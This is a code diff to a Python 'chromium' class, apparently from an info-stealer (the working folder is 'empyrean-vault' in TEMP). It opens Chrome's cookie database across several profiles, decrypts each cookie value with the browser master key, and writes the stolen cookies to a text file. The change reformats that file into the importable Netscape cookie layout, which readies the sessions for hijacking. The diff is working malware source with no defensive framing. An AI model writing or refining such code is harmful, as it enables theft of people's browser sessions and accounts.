@@ -44,7 +44,7 @@ class chromium():
             'Profile 5',
         ]
 
-        # self.working_dir = os.getcwd() + '\\empyrean-vault' #
+        # self.working_dir = os.getcwd() + '\\empyrean-vault' 
         self.working_dir = os.getenv('TEMP') + '\\empyrean-vault'
         os.mkdir(self.working_dir)
 
@@ -166,13 +166,12 @@ class chromium():
         conn = sqlite3.connect(vault)
         cursor = conn.cursor()
         with open(working_dir + '\\cookies.txt', 'a', encoding="utf-8") as f:
-            for res in cursor.execute("SELECT host_key, name, encrypted_value FROM cookies").fetchall():
-                host_key, name, encrypted_value = res
+            for res in cursor.execute("SELECT host_key, name, path, encrypted_value,expires_utc FROM cookies").fetchall():
+                host_key, name, path, encrypted_value, expires_utc = res
                 value = self.decrypt_password(encrypted_value, self.masterkey)
                 if host_key != "" and name != "" and value != "":
-                    f.write("Host: {:<40} Name: {:<40} Value: {}\n".format(
-                        host_key, name, value))
-
+                    f.write("{} {} {} {} {} {} {}\n".format(
+                        host_key, 'FALSE' if host_key.startswith('.') else 'TRUE', path, 'FALSE' if expires_utc == 0 else 'TRUE', expires_utc, name, value))
         cursor.close()
         conn.close()
         os.remove(vault)
